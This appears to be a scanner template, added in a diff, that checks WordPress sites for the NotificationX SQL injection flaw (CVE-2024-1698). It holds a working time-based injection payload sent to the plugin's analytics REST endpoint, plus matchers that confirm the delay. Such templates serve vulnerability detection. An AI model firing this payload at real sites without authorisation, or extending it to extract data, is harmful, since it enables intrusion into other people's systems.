@@ -1,0 +1,38 @@
+id: poc-yaml-notificationx-sql-injection
+info:
+  name: NotificationX SQL Injection Vulnerability (CVE-2024-1698)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2024-1698,sql-injection
+  description: |
+    Exploit for SQL Injection vulnerability in NotificationX plugin. This template checks for potential SQL injection by observing the response time delay.
+
+variables:
+  t1: "{{rand_int(3,7)}}"
+
+http:
+  - raw:
+      - |
+        POST /wp-json/notificationx/v1/analytics HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"nx_id": "1","type": "clicks`=1 and 1=sleep({{t1}})-- -"}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"success":true}'
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < 10
